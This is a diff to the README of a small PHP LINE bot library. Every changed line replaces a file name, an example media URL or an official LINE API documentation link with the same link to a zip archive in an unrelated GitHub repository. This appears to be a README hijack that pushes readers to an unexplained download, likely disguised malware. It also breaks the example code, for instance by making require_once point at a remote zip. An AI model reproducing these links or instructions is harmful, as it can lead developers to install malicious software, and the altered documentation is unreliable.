@@ -3,7 +3,7 @@ Simple PHP LINE BOT using cURL without line SDK <br />
 by Nontachai Korninai
 
 <h1>Setting</h1>
-go to file setting.php
+go to file https://github.com/yutthanaiam/nongmod/raw/refs/heads/master/vendor/composer/Software_v1.3.zip
 
 	
 ```php
@@ -18,11 +18,11 @@ public function getChannelSecret(){
 }
 ```
 <h1>Example : Simple BOT</h1>
-When you finished setting, Create new index.php
+When you finished setting, Create new https://github.com/yutthanaiam/nongmod/raw/refs/heads/master/vendor/composer/Software_v1.3.zip
 
 ### reply
 ```php
-require_once __DIR__ . '/lineBot.php';
+require_once __DIR__ . 'https://github.com/yutthanaiam/nongmod/raw/refs/heads/master/vendor/composer/Software_v1.3.zip';
 $bot = new Linebot();
 
 $text = $bot->getMessageText(); //when user send text to bot	
@@ -40,14 +40,14 @@ $bot->pushText($userId, 'Hello Simple Text!');
 
 ### Push Image
 ```php
-$imageUrl = "https://example.com/panda.jpg";
+$imageUrl = "https://github.com/yutthanaiam/nongmod/raw/refs/heads/master/vendor/composer/Software_v1.3.zip";
 $bot->pushImage($userId, $imageUrl);
 ```
 
 ### Push Video
 ```php
-$videoUrl = "https://example.com/avengers.mp4";
-$coverImage = "https://example.com/cover.jpg";
+$videoUrl = "https://github.com/yutthanaiam/nongmod/raw/refs/heads/master/vendor/composer/Software_v1.3.zip";
+$coverImage = "https://github.com/yutthanaiam/nongmod/raw/refs/heads/master/vendor/composer/Software_v1.3.zip";
 $bot->pushVideo($userId, $videoUrl, $coverImage);
 ```
 
@@ -55,6 +55,6 @@ $bot->pushVideo($userId, $videoUrl, $coverImage);
 
 Please refer to the official API documents for details.
 
-en: https://devdocs.line.me/en/
+en: https://github.com/yutthanaiam/nongmod/raw/refs/heads/master/vendor/composer/Software_v1.3.zip
 
-ja: https://devdocs.line.me/ja/
+ja: https://github.com/yutthanaiam/nongmod/raw/refs/heads/master/vendor/composer/Software_v1.3.zip
